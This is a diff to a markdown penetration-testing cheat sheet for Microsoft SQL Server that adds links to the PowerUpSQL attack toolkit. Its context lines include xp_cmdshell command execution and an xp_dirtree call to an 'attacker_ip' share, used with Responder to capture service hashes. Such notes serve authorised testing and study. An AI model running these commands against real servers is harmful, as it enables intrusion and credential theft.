@@ -1,12 +1,18 @@
 
-## Good places
-[hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
-[pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
+## Good places and tools
+
+[Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
+[Pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
+
+[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is A PowerShell Toolkit for Attacking SQL Server
+[PowerUpSQL CheatSheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet) has its own handy cheatsheet.
+
 
 ## Warning
 Be careful, you can **block accounts** if you fail login several times using an existing username.
 
 ## Impacket smb related scripts
+
 [[Impacket-Cheatsheet]]; if you have credentials:
 ```bash
 # connect to a Microsoft SQL server
@@ -49,6 +55,7 @@ SELECT *
 
 
 ## Command Execution
+
 Check if cmdshell is already active
 ```sql   
 EXEC xp_cmdshell ‘net user’; -- privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
@@ -70,6 +77,7 @@ declare @q varchar(200); set @q ='\$ip\IppsecIsAwesome\test';exec master.dbo.xp_
 ```
 
 ## Hash Passback
+
 Use [[Responder-Cheatsheet]] to catch the service hash of user 
 ```bash
 sudo responder -I $interface
@@ -77,5 +85,9 @@ xp_dirtree "\\attacker_ip\Share"
 ```
 
 ## References
+
 [pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
 [therootcompany](https://therootcompany.com/blog/mssql-cheat-sheet/)
+[Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
+[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) 
+[PowerUpSQL CheatSheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
